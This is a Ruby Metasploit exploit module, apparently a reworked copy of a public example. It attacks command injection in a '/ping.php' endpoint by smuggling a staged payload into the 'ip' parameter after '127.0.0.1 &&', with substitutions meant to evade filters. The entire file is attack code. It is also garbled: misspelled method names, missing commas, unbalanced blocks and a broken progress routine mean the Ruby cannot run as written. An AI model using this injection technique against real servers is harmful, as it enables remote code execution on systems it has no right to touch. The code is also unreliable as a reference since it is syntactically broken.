require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking

    include Msf::Exploit::CmdStager



    def intialize(info={})
    super(update_info(info,
    
    
    
    'Name'            => "CommandInjc Via CmdStager",
    'Description'     => %q{
      This exploits a command injection using the command stager.
    },
    'License'         => MSF_LICENSE,
    'Author'          => [ 'sinn3r' ],
    'Re-Updater'      => [ 'Krd-Pentester']
    'References'      => [ [ 'URL', 'http://metasploit.com' ] ],
    'Platform'        => 'linux',
    'Targets'         => [ [ 'Linux', {} ] ],
    'Payload'         => { 'BadChars' => "\x00" },
    'CmdStagerFlavor' => [ 'printf' ],
    'Privileged'      => false,
    'DisclosureDate'  => "2016-06-10",
    'DefaultTarget'   => 0))
end
    
def filter_bad_chars(cmd)
    cmd.gsub!(/chmod \+x/, 'chmod 777')
    cmd.gsub!(/;/, '%26%26')
    cmd.gsub!(/ /, '+')

end



def excute_command(cmd, opts = {})
    
    send_request_cgi({
        'method' => 'GET',
        'uri' => '/ping.php',
        'encode_params' => false
        'vars_get' => {
            'ip' => "127.0.0.1+%26%26+#{filter_bad_chars(cmd)
        }"
    }) 


end


def exploit
    print_status("Explotation Will Start ....")
    excute_command

def progress(total, sent, exploit,excute_command,filter_bad_chars)
    done = (send.to_f / total.to_f) * 100
    perecent = "%3.2f%%" % done.to_f
    print_status("Command Stager Porgress -7s done (%d%d bytes") % perecent,sent,total

end

